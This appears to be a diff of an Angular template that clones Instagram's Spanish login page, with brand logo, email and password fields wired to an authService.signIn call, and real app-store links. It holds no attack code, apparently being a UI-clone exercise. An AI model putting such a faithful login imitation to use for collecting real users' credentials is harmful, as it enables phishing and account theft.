@@ -1,204 +1,134 @@
 <span id="root">
   <section class="section-all">
-    <!-- 1-Role Main -->
-    <main class="main" role="main">
-      <div class="wrapper">
-        <article class="article">
-          <div class="content">
-            <div class="login-box">
-              <div class="header">
-                <img
-                  class="logo"
-                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
-                  alt="Instagram"
-                />
-              </div>
-              <!-- Header end -->
-              <div class="form-wrap">
-                <form class="form">
-                  <div class="input-box">
-                    <input
-                      type="text"
-                      id="name"
-                      class="form-input"
-                      aria-describedby=""
-                      placeholder=" "
-                      aria-required="true"
-                      maxlength="30"
-                      autocapitalize="off"
-                      autocorrect="off"
-                      name="email"
-                      value=""
-                      #userName
-                      required
-                    />
-                    <label for="email" class="form-label"
-                      >Correo electrónico</label
-                    >
-                  </div>
-
-                  <div class="input-box inputWithIcon">
-                    <input
-                      type="password"
-                      name="password"
-                      (input)="checkPassword($event)"
-                      [type]="hide ? 'password' : 'text'"
-                      class="form-input"
-                      id="password"
-                      placeholder=" "
-                      aria-describedby=""
-                      maxlength="30"
-                      aria-required="true"
-                      autocapitalize="off"
-                      autocorrect="off"
-                      #userPassword
-                      required
-                    />
-                    <label for="password" class="form-label">Contraseña</label>
-                    <ng-container *ngIf="this.isValidPassword">
-                      <button
-                        class="_acan _acao _acat _aj1-"
-                        type="button"
-                        (click)="hide = !hide"
-                      >
-                        {{ hide ? "Mostrar" : "Ocultar" }}
-                      </button>
-                    </ng-container>
-                  </div>
-
-                  <span class="button-box">
-                    <button
-                      class="btn"
-                      type="submit"
-                      name="submit"
-                      (click)="
-                        authService.signIn(userName.value, userPassword.value)
-                      "
-                    >
-                      <span *ngIf="!this.authService.showTextLogin"
-                        >Entrar</span
-                      >
-                      <ng-container *ngIf="this.authService.spinner | async">
-                        <div class="spinner">
-                          <div class="bar1"></div>
-                          <div class="bar2"></div>
-                          <div class="bar3"></div>
-                          <div class="bar4"></div>
-                          <div class="bar5"></div>
-                          <div class="bar6"></div>
-                          <div class="bar7"></div>
-                          <div class="bar8"></div>
-                          <div class="bar9"></div>
-                          <div class="bar10"></div>
-                          <div class="bar11"></div>
-                          <div class="bar12"></div>
-                        </div>
-                      </ng-container>
-                    </button>
-                  </span>
-
-                  <div class="_aai0">
-                    <div class="x78zum5 x1q0g3np">
-                      <div
-                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"
-                      ></div>
-                      <div
-                        class="x1qjc9v5 x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf"
-                      >
-                        o
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+          <div class="wrapper">
+              <article class="article">
+                  <div class="content">
+                      <div class="login-box">
+                          <div class="header">
+                            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+                          </div>
+                          <!-- Header end -->
+                          <div class="form-wrap">
+                              <form class="form">
+                                  <div class="input-box">
+                                      <input
+                                          type="text"
+                                          id="email"
+                                          class="form-input"
+                                          aria-describedby=""
+                                          placeholder=" "
+                                          aria-required="true"
+                                          maxlength="30"
+                                          autocapitalize="off"
+                                          autocorrect="off"
+                                          name="email"
+                                          value=""
+                                          #userName
+                                          required
+                                      />
+                                      <label for="email" class="form-label">Correo electrónico</label>
+                                  </div>
+                                  <div class="input-box inputWithIcon">
+                                      <input
+                                          type="password"
+                                          name="password"
+                                          (input)="checkPassword($event)"
+                                          [type]="hide ? 'password' : 'text'"
+                                          class="form-input"
+                                          id="password"
+                                          placeholder=" "
+                                          aria-describedby=""
+                                          maxlength="30"
+                                          aria-required="true"
+                                          autocapitalize="off"
+                                          autocorrect="off"
+                                          #userPassword
+                                          required
+                                      />
+                                      <label for="password" class="form-label">Contraseña</label>
+                                      <ng-container *ngIf="this.isValidPassword">
+                                          <button class="_acan _acao _acat _aj1-" type="button" (click)="hide = !hide">
+                                              {{ hide ? "Mostrar" : "Ocultar" }}
+                                          </button>
+                                      </ng-container>
+                                  </div>
+                                  <span class="button-box">
+                                      <button
+                                          class="btn"
+                                          type="submit"
+                                          name="submit"
+                                          (click)="authService.signIn(userName.value, userPassword.value)"
+                                      >
+                                          <span *ngIf="!this.authService.showTextLogin">Entrar</span>
+                                          <ng-container *ngIf="this.authService.spinner | async">
+                                              <div class="spinner">
+                                                  <div class="bar1"></div>
+                                                  <div class="bar2"></div>
+                                                  <div class="bar3"></div>
+                                                  <div class="bar4"></div>
+                                                  <div class="bar5"></div>
+                                                  <div class="bar6"></div>
+                                                  <div class="bar7"></div>
+                                                  <div class="bar8"></div>
+                                                  <div class="bar9"></div>
+                                                  <div class="bar10"></div>
+                                                  <div class="bar11"></div>
+                                                  <div class="bar12"></div>
+                                              </div>
+                                          </ng-container>
+                                      </button>
+                                  </span>
+                                  <div class="_aai0">
+                                      <div class="x78zum5 x1q0g3np">
+                                          <div class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"></div>
+                                          <div
+                                              class="x1qjc9v5 x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf"
+                                          >
+                                              o
+                                          </div>
+                                          <div class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"></div>
+                                      </div>
+                                  </div>
+                                  <div class="input-box" style="margin: 10px 40px 18px;">
+                                      <button class="_acan _acap _acas _aj1-" type="button"><i class="_aah_ icofont icofont-social-facebook"></i> Iniciar sesión con Facebook</button>
+                                  </div>
+                                  <a class="forgot" href="">¿Has olvidado la contraseña?</a>
+                              </form>
+                          </div>
+                          <!-- Form-wrap end -->
                       </div>
-                      <div
-                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"
-                      ></div>
-                    </div>
+                      <!-- Login-box end -->
+                      <div class="login-box">
+                          <p class="text">¿No tienes una cuenta?<a (click)="account()">Regístrate</a></p>
+                      </div>
+                      <!-- Signup-box end -->
+                      <div class="app">
+                          <p>Descarga la aplicación.</p>
+                          <div class="app-img">
+                              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
+                              </a>
+                              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
+                              </a>
+                          </div>
+                          <!-- App-img end-->
+                      </div>
+                      <!-- App end -->
                   </div>
-
-                  <div class="input-box" style="margin: 10px 40px 18px">
-                    <button class="_acan _acap _acas _aj1-" type="button">
-                      <i class="_aah_ icofont icofont-social-facebook"></i>
-                      Iniciar sesión con Facebook
-                    </button>
-                  </div>
-
-                  <a class="forgot" href="">¿Has olvidado la contraseña?</a>
-                </form>
-              </div>
-
-              <!-- Form-wrap end -->
-            </div>
-            <!-- Login-box end -->
-
-            <div class="login-box">
-              <p class="text">
-                ¿No tienes una cuenta?<a (click)="account()">Regístrate</a>
-              </p>
-            </div>
-            <!-- Signup-box end -->
-
-            <div class="app">
-              <p>Descarga la aplicación.</p>
-              <div class="app-img">
-                <a
-                  href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8"
-                >
-                  <img
-                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"
-                  />
-                </a>
-                <a
-                  href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"
-                >
-                  <img
-                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
-                  />
-                </a>
-              </div>
-              <!-- App-img end-->
-            </div>
-            <!-- App end -->
+                  <!-- Content end -->
+              </article>
           </div>
-          <!-- Content end -->
-        </article>
-      </div>
-      <!-- Wrapper end -->
-    </main>
-
-    <!-- 2-Role Footer -->
-    <footer class="footer" role="contentinfo">
-      <div class="footer-container">
-        <nav class="footer-nav" role="navigation">
-          <ul>
-            <li><a href="">About Us</a></li>
-            <li><a href="">Support</a></li>
-            <li><a href="">Blog</a></li>
-            <li><a href="">Press</a></li>
-            <li><a href="">Api</a></li>
-            <li><a href="">Jobs</a></li>
-            <li><a href="">Privacy</a></li>
-            <li><a href="">Terms</a></li>
-            <li><a href="">Directory</a></li>
-            <li>
-              <span class="language">
-                Language
-                <select
-                  name="language"
-                  class="select"
-                  onchange="la(this.value)"
-                >
-                  <option value="#">English</option>
-                  <option value="http://ru-instafollow.bitballoon.com">
-                    Russian
-                  </option>
-                </select>
-              </span>
-            </li>
-          </ul>
-        </nav>
-
-        <span class="footer-logo">&copy; 2018 Instagram</span>
-      </div>
-      <!-- Footer container end -->
-    </footer>
+          <!-- Wrapper end -->
+      </main>
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+          <ng-container>
+              <app-footerlogin> </app-footerlogin>
+          </ng-container>
+      </footer>
   </section>
 </span>
 <!-- Root -->
